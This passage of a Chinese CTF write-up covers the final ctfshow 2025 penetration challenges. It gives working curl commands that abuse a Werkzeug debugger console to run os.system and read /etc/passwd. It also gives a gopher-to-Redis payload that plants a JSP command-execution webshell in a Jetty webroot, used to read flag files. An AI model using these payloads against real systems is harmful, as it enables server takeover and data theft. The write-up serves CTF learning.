+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk&quot; &quot;http://172.2.233.6:8888/console?__debugger__=yes%26cmd=printpin%26s=fllEhSZ6f9Str0SXrsRg&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/21.png"></p>
+<p>回去查看log文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk&quot; &quot;http://172.2.233.6:8888/get_log_content?logFile=hack.log&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/22.png"></p>
+<p>拿到pin：475-350-506</p>
+<p>随后拿着pin码去验证，把cookie保留到本地</p>
+<p>随后读取ckie.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -c skie.txt -b -v &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk&quot; &quot;http://172.2.233.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=475-350-506&amp;s=fllEhSZ6f9Str0SXrsRg -t&quot;</span><br><span class="line">cat ckie.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/23.png"></p>
+<p>带着cookie去RCE</p>
+<p>这里读取无回显</p>
+<p><img src="/images/migrated/18645068/24.png"></p>
+<p>因此，外带注入。正好log目录下有任意读。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v -b  &quot;__wzd23d78edae3770f1189a2=1736173286|b290ef2b4aae&quot; &quot;http://172.2.233.6:8888/console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).system(&#x27;&#x27;&#x27;cat%20\/etc\/passwd&gt;.\/log\/hack.log&#x27;&#x27;&#x27;)&amp;frm=0&amp;s=fllEhSZ6f9Str0SXrsRg&quot;</span><br></pre></td></tr></table></figure>
+
+<p>访问hack.log即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk&quot; &quot;http://172.2.233.6:8888/get_log_content?logFile=hack.log&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/25.png"></p>
+<p>最后一行为：<code>ctfer:x:1000:1000::/home/ctfer:/bin/bash</code></p>
+<p><strong><code>ctfshow{ctfer:x:1000:1000::/home/ctfer:/bin/bash}</code></strong></p>
+<h1 id="功亏一篑"><a href="#功亏一篑" class="headerlink" title="功亏一篑"></a>功亏一篑</h1><p>这题比较基础。有密码，支持gopher，无waf，直接登录redis写马就行。因为不出网，所以还是通过输出重定向外带命令输出</p>
+<p><img src="/images/migrated/18645068/26.png"></p>
+<p>这是写php webshell的办法。参考这个办法写java的webshell即可。（一开始没写quit，可把我坑死了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth ctfshow_2025</span><br><span class="line">config set dir /opt/jetty/webapps/ROOT/</span><br><span class="line">config set dbfilename hack.jsp</span><br><span class="line">set xxx &quot;&lt;% Runtime.getRuntime().exec(new String[]&#123;\&quot;sh\&quot;,\&quot;-c\&quot;,request.getParameter(\&quot;cmd\&quot;)&#125;);%&gt;&quot;</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p>打gopher就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;gopher://172.2.221.7:6380/_auth%20ctfshow_2025%0aconfig%20set%20dir%20%2fopt%2fjetty%2fwebapps%2fROOT%2f%0aconfig%20set%20dbfilename%20hack.jsp%0aset%20xxx%20%22%3c%25%20Runtime.getRuntime().exec(new%20String%5b%5d%7b%5c%22sh%5c%22%2c%5c%22-c%5c%22%2crequest.getParameter(%5c%22cmd%5c%22)%7d)%3b%25%3e%22%0asave%0aquit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/27.png"></p>
+<p>马写上了，随后去执行命令并把请求外带出来到web目录就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v  &quot;http://172.2.221.7:8080/hack.jsp?cmd=cat%20/dylan.txt&gt;/opt/jetty/webapps/ROOT/1.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;1.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v  &quot;http://172.2.221.7:8080/1.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18645068/28.png"></p>
+<p><strong>ctfshow{7b11a7ae330883cb5bf667a9c1604635}</strong></p>
+<h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>虽然说3-1是出了很大失误，但这个CTF整体出的还是很精致的。不管是剧情，配图，还是文案都是比较新鲜的。而且属于是一靶到底的类型。中间还混入了一个打g*v的模块。只能说瑕不掩瑜，整体打下来还是很精彩的。</p>
+<p>最后：出题人辛苦了</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AF%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">启程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%8A%A0%E5%AF%86%E9%80%9A%E8%AE%AF"><span class="toc-number">2.</span> <span class="toc-text">破解加密通讯</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BD%9C%E5%85%A5%E6%95%8C%E8%90%A5"><span class="toc-number">3.</span> <span class="toc-text">潜入敌营</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A7%98%E5%AF%86%E6%BD%9C%E4%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">秘密潜伏</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E6%95%8C%E6%96%B9%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF"><span class="toc-number">5.</span> <span class="toc-text">收集敌方身份信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">横向渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1%E8%BF%B7%E4%BA%91"><span class="toc-number">7.</span> <span class="toc-text">邮箱迷云</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%89%B0%E9%9A%BE%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E6%AD%A5"><span class="toc-number">8.</span> <span class="toc-text">艰难的最后一步</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%B3%E5%B2%9B%E6%88%98%E6%9C%AF"><span class="toc-number">9.</span> <span class="toc-text">跳岛战术</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%8D%E4%B8%8B%E4%B8%80%E5%9F%8E"><span class="toc-number">10.</span> <span class="toc-text">再下一城</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A1%BA%E8%97%A4%E6%91%B8%E7%93%9C"><span class="toc-number">11.</span> <span class="toc-text">顺藤摸瓜</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%9F%E4%BA%8F%E4%B8%80%E7%AF%91"><span class="toc-number">12.</span> <span class="toc-text">功亏一篑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="toc-number">13.</span> <span class="toc-text">写在后面</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&text=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&is_video=false&description=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow 2025元旦渗透赛 wp&body=Check out this article: https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&title=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&name=ctfshow 2025元旦渗透赛 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-01-01-ctfshow-2025-wp/&t=ctfshow 2025元旦渗透赛 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
